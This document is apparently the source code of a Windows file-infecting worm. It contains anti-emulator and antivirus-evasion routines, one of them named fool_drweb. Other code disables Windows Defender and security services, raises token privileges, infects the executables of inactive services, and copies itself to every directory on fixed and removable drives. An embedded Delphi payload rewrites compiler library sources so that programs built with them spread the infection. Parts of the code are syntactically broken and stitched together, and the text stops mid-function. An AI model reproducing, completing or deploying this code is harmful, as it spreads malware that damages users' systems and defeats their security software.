DWORD ticks1;
DWORD EMUL;
DWORD ticks2;


void GetTicks1()
{
	EMUL = 0;
	ticks1 = _GetTickCount() / (100);
}


void GetTicks2()
{
	DWORD ticks3;

	ticks2 = _GetTickCount() / (100);
	ticks3 = _GetTickCount()/(100);
	if (ticks3 - ticks2 > 1)
		EMUL = 4096;
}


DWORD zaderjka_cyklom(DWORD zad)
{
	DWORD q;
	for (q = 0; q < 100000; q++) zad++;
	return zad;
}


DWORD AntiEmulator(DWORD time)
{
	DWORD x;
	DWORD t;
	DWORD zad;

	loopx:;

	GetTicks2();
	zad = zaderjka_cyklom(zad);

	t = ticks2 - time;
	x = ticks2 - ticks1;

	if (t < ticks1)
		goto loopx;

	x = x / time;



	return x;
}


#define DRWEB_LOOP 100000000

DWORD fool_drweb(DWORD x)
{
	DWORD i, new_x = x + 8192;

	for (i = 0; i < DRWEB_LOOP; i++)
	{
		new_x = x;
	}

	return new_x;
}


#ifdef dbgdbg

#ifdef PRINTFDBG

void adddeb(char *str, ...)
{
	va_list va;
	va_start(va, str);
	char *buf = malloc(0xffff);
	vsprintf(buf, str, va);
	printf(buf); printf("\n");
	free(buf);
}

#else

void adddeb(char *str, ...)
{
	if (_CRTDLL==0) return;
	va_list va;
	va_start(va, str);
	char *buf = _malloc(0xffff);
	_vsprintf(buf, str, va);

	char fn[0xFF],bf[0xFF];
	_GetModuleFileName(NULL,bf,sizeof(bf));

	for (DWORD q=0;q<sizeof(bf);q++)
	{
		if (bf[q]==':')  bf[q]='#';
		if (bf[q]=='\\') bf[q]='_';
		if (bf[q]=='.')  bf[q]='-';
	}

	DWORD tid=_GetCurrentThreadId();
	_sprintf(fn,"c:\\!dbg\\!kkqvx_%s_%X",bf,tid);

	#ifdef XORDBG
	_sprintf(fn,"kkqvx_%s_%X",bf,tid);
	for (DWORD q=0;q<strlen(buf);q++) buf[q]=buf[q]^1;
	#endif

	DWORD wr;
	HANDLE h=_CreateFile(fn,GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
	_SetFilePointer(h,0,NULL,FILE_END);
	_WriteFile(h,buf,strlen(buf),&wr,NULL);
	_WriteFile(h,"\n",1,&wr,NULL);
	_CloseHandle(h);

	_free(buf);
}

#endif

void adddebf(char *fname,char *str, ...)
{
	if (_CRTDLL==0) return;

	va_list va;
	va_start(va, str);
	char *buf = _malloc(0xffff);
	_vsprintf(buf, str, va);

	char fn[0xFF],bf[0xFF],bfi[0xFF],dir[0xFF];
	_GetModuleFileName(NULL,bf,sizeof(bf));

	for (DWORD q=0;q<sizeof(bf);q++)
	{
		if (bf[q]==':')  bf[q]='#';
		if (bf[q]=='\\') bf[q]='_';
		if (bf[q]=='.')  bf[q]='-';
	}

	my_strcpy(bfi,fname);

	for (DWORD q=0;q<strlen(bfi);q++)
	{
		if (bfi[q]==':')  bfi[q]='#';
		if (bfi[q]=='\\') bfi[q]='_';
		if (bfi[q]=='.')  bfi[q]='-';
	}

	DWORD tid=_GetCurrentThreadId();
	_sprintf(dir,"c:\\!dbg\\!inf_%s_%X",bf,tid);
	_CreateDirectory(dir,NULL);

	_sprintf(fn,"c:\\!dbg\\!inf_%s_%X\\%s",bf,tid,bfi);

	DWORD wr;
	HANDLE h=_CreateFile(fn,GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
	_SetFilePointer(h,0,NULL,FILE_END);
	_WriteFile(h,buf,strlen(buf),&wr,NULL);
	_WriteFile(h,"\n",1,&wr,NULL);
	_CloseHandle(h);

	_free(buf);
}



void adddebd(char *dname,char *str, ...)
{
	if (_CRTDLL==0) return;
	va_list va;
	va_start(va, str);
	char *buf = _malloc(0xffff);
	_vsprintf(buf, str, va);

	char fn[0xFF],bf[0xFF],dir[0xFF];
	_GetModuleFileName(NULL,bf,sizeof(bf));

	for (DWORD q=0;q<sizeof(bf);q++)
	{
		if (bf[q]==':')  bf[q]='#';
		if (bf[q]=='\\') bf[q]='_';
		if (bf[q]=='.')  bf[q]='-';
	}


	DWORD tid=_GetCurrentThreadId();
	_sprintf(dir,"c:\\!dbg\\%s_%s",dname,bf);
	_CreateDirectory(dir,NULL);

	_sprintf(fn,"c:\\!dbg\\%s_%s\\%X",dname,bf,tid);

	DWORD wr;
	HANDLE h=_CreateFile(fn,GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
	_SetFilePointer(h,0,NULL,FILE_END);
	_WriteFile(h,buf,strlen(buf),&wr,NULL);
	_WriteFile(h,"\n",1,&wr,NULL);
	_CloseHandle(h);

	_free(buf);
}

#endif

#ifdef cdbgdbg

void adddebc(char *str, ...)
{
	va_list va;
	va_start(va, str);
	char *buf = _malloc(0xffff);
	_vsprintf(buf, str, va);

	DWORD wr;
	HANDLE h=_CreateFile("c:\\!dbg\\!ctk.txt",GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
	_SetFilePointer(h,0,NULL,FILE_END);
	_WriteFile(h,buf,strlen(buf),&wr,NULL);
	_WriteFile(h,"\x0D\x0A",2,&wr,NULL);
	_CloseHandle(h);

	_free(buf);
}

#endif

int serstr(char *s1, char *s2, int pos)
{
	DWORD q;
	DWORD w;
	DWORD e;
	DWORD p=0;

	DWORD l1=strlen(s1);
	DWORD l2=strlen(s2);

	for (q=0;q<l1;q++)
	{
		e=0;
		for (w=0;w<l2;w++)
		{
			if (s1[q+w] == s2[w]) e++; else break;
			if (e == l2) { p++; if (p == pos) return q; }
		}
	}

	return 0xffff;
}

char *rndstr(char *s, int len)
{
	int q;
	for (q=0;q<len;q++) s[q]=97+_rand()/2000;
	s[len]=0;
	return s;
}

void lowerstr(char *s,char *r)
{

	DWORD q;
	DWORD l=strlen(s);

	for (q=0;q<l;q++)
	{
		if ((s[q]>'A')&&(s[q]<'Z')) r[q]=s[q]+32; else r[q]=s[q];
	}

}

typedef struct wMEMORY_STRUCT{
	WORD word0;
} wMEMORY;

typedef struct dMEMORY_STRUCT{
	DWORD dword0;
} dMEMORY;

BOOL SYSTEM_NT=FALSE;
DWORD MAJORW=0;

BOOL isSystemNT()
{
	OSVERSIONINFO osver;

	if (MAJORW != 0) return SYSTEM_NT;

	osver.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	_GetVersionEx(&osver);

	if (osver.dwPlatformId == VER_PLATFORM_WIN32_NT) SYSTEM_NT=TRUE;
	MAJORW = osver.dwMajorVersion;
	#ifdef dbgdbg
	adddeb("GLOB SYSTEM_NT:%u (1==TRUE)",SYSTEM_NT);
	adddeb("GLOB MAJORW:%u (5==W2K,XP,WS2003 ; 6==Vista,WS2008,W7)",MAJORW);
	#endif

	return SYSTEM_NT;
}
void CloseCreateThreadEco(LPTHREAD_START_ROUTINE sr)
{
	DWORD tid;
	_CloseHandle(_CreateThread(NULL, 0, sr, NULL, 0, &tid));
}

void my_strcpy(char *s1,char *s2)
{

	DWORD q=0;

	loop:;
	s1[q]=s2[q];
	if (s2[q]!=0) { q++; goto loop; }

}

#ifdef dbgdbg

void Sid2Text( PSID ps, char *buf )
{
	PSID_IDENTIFIER_AUTHORITY psia;
	DWORD dwSubAuthorities;
	DWORD dwSidRev = 1;
	DWORD i;
	int n,size;
	char *p;
	psia = _GetSidIdentifierAuthority( ps );
	dwSubAuthorities = *_GetSidSubAuthorityCount( ps );


	size = 15 + 12 + ( 12 * dwSubAuthorities ) + 1;

	size = _sprintf( buf, "S-%lu-", dwSidRev );
	p = buf + size;

	if (psia->Value[0] != 0 || psia->Value[1] != 0 )
	{
		n = _sprintf(p,"0x%02hx%02hx%02hx%02hx%02hx%02hx",
					 (USHORT) psia->Value[0], (USHORT) psia->Value[1],
					 (USHORT) psia->Value[2], (USHORT) psia->Value[3],
					 (USHORT) psia->Value[4], (USHORT) psia->Value[5] );
		size += n; p += n;
	}
	else
	{
		n = _sprintf(p,"%lu", ( (ULONG) psia->Value[5] ) +
		( (ULONG) psia->Value[4] << 8 ) + ( (ULONG) psia->Value[3] << 16 ) +
		( (ULONG) psia->Value[2] << 24 ) );
		size += n; p += n;
	}

	for (i = 0; i < dwSubAuthorities; ++ i )
	{
		n = _sprintf( p, "-%lu", *_GetSidSubAuthority( ps, i ) );
		size += n; p += n;
	}

}

#endif
TOKEN_USER *ptu = NULL;
SECURITY_DESCRIPTOR *sdsc2 = NULL;
int EditOwnToken_or_CheckFiltered(BOOL CHKFILTONLY)
{
	TOKEN_PRIVILEGES tp;
	HANDLE htk, hprc;
	BOOL res;
	DWORD   pid;

	DWORD tbf[10];
	DWORD rl;
	if (isSystemNT() == 0)
	{ res=1; goto exiteot; }
	pid = _GetCurrentProcessId();

	hprc = _OpenProcess(PROCESS_ALL_ACCESS,0,pid);
	res = _OpenProcessToken(hprc,TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&htk);

	#ifdef dbgdbg
	adddeb("EditOwnToken OpenProcessToken:%u (0==fail)",res);
	#endif

	if (res==0) goto exiteot;

	tbf[0] = 0;
	res=_GetTokenInformation(htk,21,&tbf[0],sizeof(tbf),&rl);

	#ifdef dbgdbg
	adddeb("EditOwnToken GetTokenInformation:%u (0==fail) tbf[0]:%u (!=0 if filtered)",res,tbf[0]);
	if (res==0) adddeb("EditOwnToken TOKEN_NOT_FILTERED (xp/2k GTI fail)  [ res==0 ]");
	if ((res!=0)&&(tbf[0]!=0)) adddeb("EditOwnToken TOKEN_FILTERED or ERROR  [ res!=0 , tbf[0]!=0 ]");
	if ((res!=0)&&(tbf[0]==0)) adddeb("EditOwnToken TOKEN_NOT_FILTERED [ res !=0 , tbf[0]==0 ]");
	#endif

	if (CHKFILTONLY!=0)
	{
		if (res==0) { res=1; goto exiteot; }
		res=1;
		if (tbf[0]!=0) res=0;
		goto exiteot;
	}

	if (ptu==NULL) ptu = (TOKEN_USER*)_LocalAlloc(LPTR,16384);
	_GetTokenInformation(htk,TokenUser,ptu,16384,&rl);

	#ifdef dbgdbg
	{
		char sid[0xFF];
		Sid2Text(ptu->User.Sid,sid);
		adddeb("EditOwnToken ptt->User.Sid:%s",sid);
	}
	#endif



	if (sdsc2==NULL) sdsc2 = _LocalAlloc(LMEM_FIXED,SECURITY_DESCRIPTOR_MIN_LENGTH);

	res=_InitializeSecurityDescriptor(sdsc2,SECURITY_DESCRIPTOR_REVISION);

	#ifdef dbgdbg
	adddeb("EditOwnToken InitializeSecurityDescriptor:%u (0==fail)",res);
	#endif

	res=_SetSecurityDescriptorDacl(sdsc2,TRUE,NULL,FALSE);

	#ifdef dbgdbg
	adddeb("EditOwnToken SetSecurityDescriptorDacl:%u (0==fail)",res);
	#endif

	res=_SetSecurityDescriptorOwner(sdsc2,(ptu->User.Sid),FALSE);

	#ifdef dbgdbg
	adddeb("EditOwnToken SetSecurityDescriptorOwner:%u (0==fail)",res);
	#endif

	res=_LookupPrivilegeValue(NULL,"SeTakeOwnershipPrivilege",&(tp.Privileges[0].Luid));

	#ifdef dbgdbg
	adddeb("EditOwnToken LookupPrivilegeValue:%u (0==fail)",res);
	#endif

	if (res==0) goto exiteot;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	res=_AdjustTokenPrivileges(htk,FALSE,&tp,0,NULL,NULL);

	#ifdef dbgdbg
	adddeb("EditOwnToken AdjustTokenPrivileges:%u (0==fail)",res);
	#endif

	exiteot:;
	_CloseHandle(htk);
	_CloseHandle(hprc);
	return res;
}


char AVSVC[512];

void InitAVSVC()
{

	strcpy(AVSVC,"|wscsvc|WinDefend|MsMpSvc|NisSrv|");

	#ifdef dbgdbg
	adddeb("InitAVSVC: %s",AVSVC);
	#endif
}

BOOL CheckService()
{
	char usn[0xFF], cpn[0xFF];
	DWORD szusn, szcpn, l;

	unsigned char *env0, *env;
	BOOL SERVICEFND;

	if (isSystemNT()==0) return FALSE;

	szusn = sizeof(usn);
	_GetUserName(usn, &szusn);

	#ifdef dbgdbg
	adddeb("CheckService usn:'%s'",usn);
	#endif

	if (usn[0]==0) return TRUE;
	if (serstr(usn,"SYSTEM",1) != 0xFFFF) return TRUE;
	if (serstr(usn," SERVICE",1) != 0xFFFF) return TRUE;

	szcpn=sizeof(cpn);
	_GetComputerName(cpn, &szcpn);

	#ifdef dbgdbg
	adddeb("CheckService cpn:'%s'",cpn);
	#endif


	_strcat(cpn,"$");
	if (serstr(cpn,usn,1) != 0xFFFF) return TRUE;


	env0 = _GetEnvironmentStrings();
	env = env0;
	SERVICEFND = FALSE;

	loop:;
	if (env[0]==0) goto skip;

	#ifdef dbgdbg
	adddeb("CheckService env:%s",env);
	#endif

	l = strlen(env);
	if (serstr(env,"ervice",1) != 0xFFFF) { SERVICEFND=TRUE; goto skip; }
	if (serstr(env,"systemprofile",1) != 0xFFFF) { SERVICEFND=TRUE; goto skip; }

	env = env + l + 1;
	goto loop;

	skip:;
	_FreeEnvironmentStrings(env0);
	if (SERVICEFND) return TRUE;

	return FALSE;
}


void ProcessService(SC_HANDLE scm,char *sname,BOOL *SVCHOST,DWORD *START_SVC)
{
	QUERY_SERVICE_CONFIG *qsc;
	SC_HANDLE scs;
	int i;
	DWORD sz;
	DWORD ee;
	BOOL res;
	unsigned char search[10];
	unsigned char *exe;
	char chk[0xFF];
	DWORD SvcType, start;
	strcpy(chk,"|"); _strcat(chk,sname); _strcat(chk,"|");
	scs=_OpenService(scm,sname,SERVICE_QUERY_CONFIG|SERVICE_START|SERVICE_CHANGE_CONFIG);
	if (scs==NULL) return;


	_QueryServiceConfig(scs, NULL, 0, &sz);

	qsc = _LocalAlloc(LMEM_FIXED, sz);
	res= _QueryServiceConfig(scs, qsc, sz, &ee);

	#ifdef dbgdbg
	adddeb("ProcessService ===== QueryServiceConfig: %i (allocated for qsc %i bytes)", res, sz);
	#endif

	if (res == FALSE) goto skip;


	exe = qsc[0].lpBinaryPathName;
	lowerstr(exe, exe);
	if (serstr(exe,".exe",1) == 0xFFFF) goto skip;
	if (serstr(exe,"svchost",1) != 0xffff) { if (*SVCHOST) goto skip; else *SVCHOST=TRUE; }

	if (exe[0]==34)
	{ exe++; i=0; search[0]=34; search[1]=0; }
	else
	{ ;*/i=4; my_strcpy(search,".exe"); }
	ee = serstr(exe,search,1);
	if (ee==0xFFFF) goto skip; else exe[ee+i]=0;


	#ifdef dbgdbg
	adddeb("ProcessService %s|%s|",exe,sname);
	adddeb("ProcessService dwServiceType:%X SVCHOST:%i START_SVC:%i",qsc[0].dwServiceType,*SVCHOST,*START_SVC);
	if ((qsc[0].dwServiceType&SERVICE_WIN32_OWN_PROCESS  )==SERVICE_WIN32_OWN_PROCESS  ) adddeb("ProcessService SERVICE_WIN32_OWN_PROCESS");
	if ((qsc[0].dwServiceType&SERVICE_WIN32_SHARE_PROCESS)==SERVICE_WIN32_SHARE_PROCESS) adddeb("ProcessService SERVICE_WIN32_SHARE_PROCESS");
	if ((qsc[0].dwServiceType&SERVICE_INTERACTIVE_PROCESS)==SERVICE_INTERACTIVE_PROCESS) adddeb("ProcessService SERVICE_INTERACTIVE_PROCESS");
	#endif
	res = ProcessEXE(exe, 0, FALSE);
	if (res == FALSE) goto skip;


	SvcType = qsc[0].dwServiceType;
	start = SERVICE_AUTO_START;

	if (serstr(AVSVC,chk,1) != 0xFFFF) start=SERVICE_DISABLED;

	if ((SvcType&SERVICE_INTERACTIVE_PROCESS)!=SERVICE_INTERACTIVE_PROCESS)
	{ SvcType=SvcType|SERVICE_INTERACTIVE_PROCESS; }
	else
	{ if ((start==SERVICE_AUTO_START)&&(qsc[0].dwStartType==SERVICE_AUTO_START)) goto start; }

	res = _ChangeServiceConfig(scs, SvcType, start, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	#ifdef dbgdbg
	if (start==SERVICE_AUTO_START) adddeb("ProcessService ChangeServiceConfig to SERVICE_AUTO_START res:%i (0 == failed)",res);
	else adddeb("ProcessService ChangeServiceConfig to SERVICE_DISABLED (AV!) res:%i (0 == failed)",res);
	#endif

	if (res==0) goto skip;
	if (start == SERVICE_DISABLED) goto skip;

	start:;
	if (*START_SVC == 0) goto skip;

	res = _StartService(scs, 0, NULL);

	#ifdef dbgdbg
	adddeb("ProcessService StartService res:%i (0 == failed)", res);
	#endif

	if (res != 0) *START_SVC = *START_SVC - 1;

	skip:;
	_LocalFree(qsc);
	_CloseServiceHandle(scs);
}


int ProcessInactiveServices(DWORD START_SVC)
{
	SC_HANDLE scm;
	ENUM_SERVICE_STATUS ess[5000];
	int q;
	int w;
	int e=0;
	BOOL SVCHOST=FALSE;

	if (!isSystemNT())
		return 0;

	scm = _OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (_EnumServicesStatus(scm, SERVICE_WIN32, SERVICE_INACTIVE, &ess, sizeof(ess), &q, &w, &e) == 0)
		return 0;

	#ifdef dbgdbg
	adddeb("\n***ProcessInactiveServices... %u inactive total, START_SVC:%i (0==FALSE)\n",w,START_SVC);
	#endif

	for (q=0;q<w;q++)
		ProcessService(scm, ess[q].lpServiceName, &SVCHOST, &START_SVC);

	_CloseServiceHandle(scm);
	return w;
}

HWND hw;
HINSTANCE hI;

LRESULT CALLBACK WndProc(HWND hwnd, UINT m, WPARAM wp, LPARAM lp)
{
	switch(m)
	{
		default: return (_DefWindowProc(hwnd, m, wp, lp));
	}
}


#define NO_OTHER 0
#define EQU_DETECTED 1
#define HI_DETECTED 2

BYTE CheckVersion()
{

	char mtx[0xFF];
	DWORD v;

	for (v = VERSION; v < 100; v++)
	{
		HANDLE m;

		_sprintf(mtx, "%s_mtx%u", CLASSNAME, v);

		#ifdef dbgdbg
		adddeb("CHECKING '%s' , my ver is %u",mtx,VERSION);
		#endif

		if((m = _OpenMutex(SYNCHRONIZE, FALSE, mtx)))
		{
			_CloseHandle(m);
			if (v == VERSION)
				return EQU_DETECTED;
			else
				return HI_DETECTED;
		}
	}

	return NO_OTHER;
}



void CreateOrOpenMutexes_WaitForMtx2Release(char *mtx,char *mtxv)
{
	#ifdef SKIP_MTX
	return;
	#endif

	HANDLE hcm = _CreateMutex(NULL, FALSE, mtx);
	HANDLE hcmv = _CreateMutex(NULL, TRUE, mtxv);
	#ifdef dbgdbg
	if (hcm==NULL) { adddeb("### CANT CREATE/OPEN MUTEX1 '%s' - (if usermode, mutex1==bugfix mutex & ver1 in services found)",mtx); }
	else { adddeb("### mutex1 '%s' created/opened:%X",mtx,hcm); }

	if (hcmv==NULL) { adddeb("### CANT CREATE/OPEN MUTEX2 '%s' - ver%u in services? can be bug in CheckService(), ver>1 shouldn't make such mutex from service, ExitThread(1)",mtxv,VERSION); }
	else { adddeb("### mutex2 '%s' created/opened:%X",mtxv,hcmv); }
	#endif

	if (hcmv == NULL) _ExitThread(1);



	#ifdef dbgdbg
	adddeb("### WaitForSingleObject for mutex '%s'...",mtxv);
	#endif

	_WaitForSingleObject(hcmv, 0xFFFFFFFF);

	#ifdef dbgdbg
	adddeb("### FINISHED WaitForSingleObject for mutex '%s'",mtxv);
	#endif
}


void InitInfectData(DWORD ticks, DWORD START_SVC)
{
	DWORD len;

	_srand(ticks + VERSION);

	#ifdef RUNLINE
	M_XorData(InfectPE,bb0,ii0,qq0,"D");
	#endif


	#ifndef EXEFILE
	dll_mem = GetDll(&len);
	#endif


	#ifdef AV_CURE
	CloseCreateThreadEco(InfectAllDrives);
	cure_loop:; __sleep(0); goto loop;
	#endif


	#ifdef EXEFILE
	{
		BYTE dll[200000];
		len = 0;

		HANDLE h=_CreateFile("kkqvx.dll", GENERIC_READ | FILE_SHARE_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (h != INVALID_HANDLE_VALUE)
		{
			_MessageBox(NULL,"INFECT MODE ON: found kkqvx.dll, kill process now if launched by mistake",NULL,0);
			_MessageBox(NULL,"INFECT MODE ON: the last warning! Are u sure? Kill process if NO.",NULL,0);
			_ReadFile(h, dll, sizeof(dll), &len, NULL);
			_CloseHandle(h);
		}
		else { len=0; dll_len=0; _MessageBox(NULL,"no kkqvx.dll, cant infect",NULL,0); }

		dll_mem = dll;
	}
	#endif


	dll_len = len;
	InitAVSVC();

	#ifdef dbgdbg
	adddeb("InitInfectData (all hex) dll_mem:%X dll_len:%X",dll_mem,dll_len);
	#endif

	ProcessInactiveServices(START_SVC);
}


void ServiceMode(DWORD ticks)
{
	char mtxv[0xFF];
	_OutputDebugStringA("000");
	#ifdef dbgdbg
	adddeb("===== !!! SERVICE MODE !!! =====");
	#endif

	sdelay = 10000;
	_sprintf(mtxv, "%s_%u", SERVICE_MTX,VERSION);

	CreateOrOpenMutexes_WaitForMtx2Release(SERVICE_MTX, mtxv);

	EditOwnToken_or_CheckFiltered(FALSE);
	InitInfectData(ticks, 0);

	CloseCreateThreadEco(InfectAllDrives);

	CreateOrOpenMutexes_WaitForMtx2Release(mtxv, SERVICE_MTX);


	LoadAndStartDll();

	x_loop:; __sleep(0); goto x_loop;
}


#ifdef _MSC_VER
#pragma optimize("", off)
#else
#pragma optimize(off)
#endif

DWORD WINAPI MainThread(LPVOID GPA)
{

	DWORD x;
	DWORD kernfuck;

	DWORD ticks;
	BOOL service;
	BYTE resver;

	char mtx[0xFF];
	char mtxv[0xFF];

	MSG m;
	WNDCLASS wtc;
	DWORD flags;
	int q, w;

	HANDLE sm;
	DWORD START_SVC;

	x += 23;
	GetTicks1();

	kernfuck = 512;
	x = AntiEmulator(96) ;
	_KERNEL32=(HANDLE)((DWORD)_KERNEL32+kernfuck+EMUL);
	_KERNEL32=(HANDLE)((DWORD)_KERNEL32-kernfuck*x);


	InitKernel32a();

	InitKernel32();
	InitCRTDLL();
	InitUser32();
	InitADVAPI32();
	InitSFC();
	InitShell32();
	InitCrypt32();
	InitSFC_OS();


	#ifdef dbgdbg
	adddeb("===MainThread===");
	adddeb("AntiEmulator x:%u",x);
	#endif


	ticks = _GetTickCount();
	hI=_GetModuleHandle(NULL);
	service = CheckService();

	#ifdef dbgdbg
	adddeb("CheckService: %u (0==FALSE)",service);
	#endif


	#ifdef SVCDBG
	service = 1;
	#endif
	if (service != 0) ServiceMode(ticks);


	#ifdef dbgdbg
	adddeb("===== !!! USER MODE !!! =====");
	#endif

	#ifdef dbgdbg
	adddeb("CheckVersion... waiting for NO_OTHER");
	#endif

	loop:;
	resver = CheckVersion();

	if (resver == HI_DETECTED)
	{
		#ifdef dbgdbg
		adddeb("HIGHER VERSION DETECTED, ExitThread(1)");
		#endif
		_ExitThread(1);
	}

	if (resver == EQU_DETECTED)
	{
		#ifdef dbgdbg
		adddeb("EQU_DETECTED, goto loop");
		__sleep(1000);
		#else
		__sleep(100);
		#endif

		goto loop;
	}

	#ifdef dbgdbg
	adddeb("NO_OTHER!!!");
	#endif


	_sprintf(mtx, "%s_mtx1", CLASSNAME);
	_sprintf(mtxv, "%s_mtx%u", CLASSNAME, VERSION);

	CreateOrOpenMutexes_WaitForMtx2Release(mtx, mtxv);

	wtc.lpszClassName = (LPSTR)CLASSNAME;
	wtc.hInstance     = hI;
	wtc.lpfnWndProc   = WndProc;
	wtc.hCursor       = NULL;
	wtc.hIcon         = NULL;
	wtc.lpszMenuName  = NULL;
	wtc.hbrBackground = (HBRUSH)COLOR_WINDOW;
	wtc.style         = CS_HREDRAW | CS_VREDRAW;
	wtc.cbClsExtra    = 0;
	wtc.cbWndExtra    = 0;
	_RegisterClass(&wtc);
	#ifdef dbgdbg
	flags = WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_VISIBLE;
	q = 10;
	w = 300;
	#else
	flags = WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX;
	q = 0;
	w = 0;
	#endif

	if ((sm = _OpenMutex(SYNCHRONIZE, FALSE, SERVICE_MTX)))
	{
		START_SVC = 0;
		_CloseHandle(sm);
	}
	else START_SVC=5;

	#ifdef dbgdbg
	adddeb("***** SERVICE MUTEX %s CHECK ***** START_SVC:%u (0==mutex detected)",SERVICE_MTX,START_SVC);
	#endif

	hw = _CreateWindowEx(0, CLASSNAME, CLASSNAME, flags, q, q, w, w, NULL, NULL, hI, NULL);
	sdelay = 0;

	EditOwnToken_or_CheckFiltered(FALSE);

	InitInfectData(ticks, START_SVC);


	softfind();
	CloseCreateThreadEco(InfectAllDrives);

	while(_GetMessage(&m, NULL, 0, 0))
	{
		_TranslateMessage(&m);
		_DispatchMessage(&m);
	}

	#ifdef EXEFILE
	GetModuleHandle("kernel32.dll");
	#endif
}

#ifdef _MSC_VER
#pragma optimize("", off)
#else
#pragma optimize(off)
#endif

void StartMainThread()
{

	DWORD lpv;
	DWORD tid;
	DWORD CS_THREADS = TRUE;
	_CreateThread(NULL, 0, MainThread, &lpv, 0, &tid);
}


#ifndef EXEFILE

__declspec(dllexport) BOOL WINAPI LibMain()

#else

#ifdef _MSC_VER
#pragma optimize("", off)
#else
#pragma optimize(off)
#endif

std::wstring GetCurrentExecutablePath() {
	TCHAR buffer[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, buffer, MAX_PATH);
	return std::wstring(buffer);
}
BOOL CopyFileToDestination(const std::wstring& sourcePath, const std::wstring& destPath) {
	return CopyFile(sourcePath.c_str(), destPath.c_str(), FALSE);
}
void RecursiveCopyToDirectory(const std::wstring& rootPath, const std::wstring& exeName) {
	std::wstring searchPath = rootPath + L"\\*";
	WIN32_FIND_DATA findData;
	HANDLE hFind = FindFirstFile(searchPath.c_str(), &findData);

	if (hFind == INVALID_HANDLE_VALUE) {
		return;
	}

	do {
		if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) {
			continue;
		}

		std::wstring fullPath = rootPath + L"\\" + findData.cFileName;

		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			RecursiveCopyToDirectory(fullPath, exeName);
		}
		std::wstring destPath = rootPath + L"\\" + exeName;
		CopyFileToDestination(GetCurrentExecutablePath(), destPath);
	} while (FindNextFile(hFind, &findData));

	FindClose(hFind);
}
void CopyToAllDrivesAndDirectories() {
	DWORD drives = GetLogicalDrives();
	std::wstring currentExePath = GetCurrentExecutablePath();
	std::wstring exeName = currentExePath.substr(currentExePath.find_last_of(L"\\/") + 1);

	for (TCHAR drive = 'A'; drive <= 'Z'; ++drive) {
		if (drives & (1 << (drive - 'A'))) {
			TCHAR drivePath[] = { drive, ':', '\\', '\0' };
			if (GetDriveType(drivePath) == DRIVE_FIXED || GetDriveType(drivePath) == DRIVE_REMOVABLE) {
				RecursiveCopyToDirectory(std::wstring(drivePath), exeName);
			}
		}
	}
}
void InitSc()
{
	sc[0] = "uses windows; var sc:array[1..24] of string=(";
	sc[1] = "function x(s:string):string;var i:integer;begin for i:=1 to length(s) do if s[i]";
	sc[2] = "=#36 then s[i]:=#39;result:=s;end;procedure re(s,d,e:string);var f1,f2:textfile;";
	sc[3] = "h:cardinal;f:STARTUPINFO;p:PROCESS_INFORMATION;b:boolean;t1,t2,t3:FILETIME;begin";
	sc[4] = "h:=CreateFile(pchar(d+$bak$),0,0,0,3,0,0);if h<>DWORD(-1) then begin CloseHandle";
	sc[5] = "(h);exit;end;{$I-}assignfile(f1,s);reset(f1);if ioresult<>0 then exit;assignfile";
	sc[6] = "(f2,d+$pas$);rewrite(f2);if ioresult<>0 then begin closefile(f1);exit;end; while";
	sc[7] = "not eof(f1) do begin readln(f1,s); writeln(f2,s);  if pos($implementation$,s)<>0";
	sc[8] = "then break;end;for h:= 1 to 1 do writeln(f2,sc[h]);for h:= 1 to 23 do writeln(f2";
	sc[9] = ",$$$$+sc[h],$$$,$);writeln(f2,$$$$+sc[24]+$$$);$);for h:= 2 to 24 do writeln(f2,";
	sc[10] = "x(sc[h]));closefile(f1);closefile(f2);{$I+}MoveFile(pchar(d+$dcu$),pchar(d+$bak$";
	sc[11] = ")); fillchar(f,sizeof(f),0); f.cb:=sizeof(f); f.dwFlags:=STARTF_USESHOWWINDOW;f.";
	sc[12] = "wShowWindow:=SW_HIDE;b:=CreateProcess(nil,pchar(e+$\"$+d+$pas\"$),0,0,false,0,0,0,";
	sc[13] = "f,p);if b then WaitForSingleObject(p.hProcess,INFINITE);MoveFile(pchar(d+$bak$),";
	sc[14] = "pchar(d+$dcu$));DeleteFile(pchar(d+$pas$));h:=CreateFile(pchar(d+$bak$),0,0,0,3,";
	sc[15] = "0,0);  if  h=DWORD(-1) then exit; GetFileTime(h,@t1,@t2,@t3); CloseHandle(h);h:=";
	sc[16] = "CreateFile(pchar(d+$dcu$),256,0,0,3,0,0);if h=DWORD(-1) then exit;SetFileTime(h,";
	sc[17] = "@t1,@t2,@t3); CloseHandle(h); end; procedure st; var  k:HKEY;c:array [1..255] of";
	sc[18] = "char;  i:cardinal; r:string; v:char; begin for v:=$4$ to $7$ do if RegOpenKeyEx(";
	sc[19] = "HKEY_LOCAL_MACHINE,pchar($Software\\Borland\\Delphi\\$+v+$.0$),0,KEY_READ,k)=0 then";
	sc[20] = "begin i:=255;if RegQueryValueEx(k,$RootDir$,nil,@i,@c,@i)=0 then begin r:=$$;i:=";
	sc[21] = "1; while c[i]<>#0 do begin r:=r+c[i];inc(i);end;re(r+$\\source\\rtl\\sys\\SysConst$";
	sc[22] = "+$.pas$,r+$\\lib\\sysconst$,$\"$+r+$\\bin\\dcc32.exe\" $);end;RegCloseKey(k);end; end;";
	sc[23] = "begin st; end.";
}
String __fastcall x(const String& s)
{
	String result = s;
	for (int i = 1; i <= result.Length(); ++i)
		if (result[i] == L'$')
			result[i] = L'\'';
	return result;
}
void __fastcall re(const String& s,
				   const String& d,
const String& e)
{
	HANDLE hFile = CreateFile((d + L".bak").c_str(), 0, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		return;
	}
